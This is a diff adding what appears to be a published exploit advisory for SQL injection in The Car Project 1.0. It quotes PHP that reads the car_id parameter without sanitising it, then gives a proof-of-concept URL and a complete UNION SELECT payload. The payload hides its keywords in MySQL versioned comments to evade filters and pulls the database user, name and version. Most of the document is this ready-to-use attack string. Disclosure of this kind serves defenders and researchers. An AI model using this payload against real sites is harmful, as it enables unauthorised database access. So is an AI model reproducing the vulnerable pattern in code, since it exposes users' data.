@@ -1,0 +1,39 @@
+# # # # # 
+# Exploit Title: The Car Project 1.0 - SQL Injection
+# Dork: N/A
+# Date: 05.09.2017
+# Vendor Homepage: http://thecarproject.org/
+# Software Link: http://thecarproject.org/thecarproject.zip
+# Demo: http://www.thecarproject.org/cp
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 	
+# Vulnerable Source:
+#
+# <?php
+# .............
+# if(isset($_GET['car_id'])) {
+# $motor_id = $_GET['car_id'];
+# if (!empty($_GET['man_id'])){
+# $manufacturer_id = $_GET['man_id'];
+# }
+# .............
+# ?>
+#
+# Proof of Concept:
+# 
+# http://localhost/[PATH]/info.php?car_id=[SQL]
+# 
+# -5+/*!11122uNiOn*/(/*!11122sELect*/0x283129,0x283229,/*!11122CONCAT_WS*/(0x203a20,/*!11122USER*/(),/*!11122DATABASE*/(),VERSION()),0x283429,0x283529,0x283629,0x283729,0x283829,0x283929,0x28313029,0x28313129,0x28313229,0x28313329,0x28313429,0x28313529,0x28313629,0x28313729,0x28313829,0x28313929,0x28323029,0x28323129,0x28323229,0x28323329,0x28323429,0x28323529,0x28323629,0x28323729,0x28323829,0x28323929,0x28333029,0x28333129,0x28333229,0x28333329,0x28333429,0x28333529,0x28333629,0x28333729,0x28333829,0x28333929,0x28343029,0x28343129,0x28343229,0x28343329,(44),0x28343529,0x28343629,0x28343729,0x28343829,0x28343929)
+# 
+# Etc..
+# # # # #
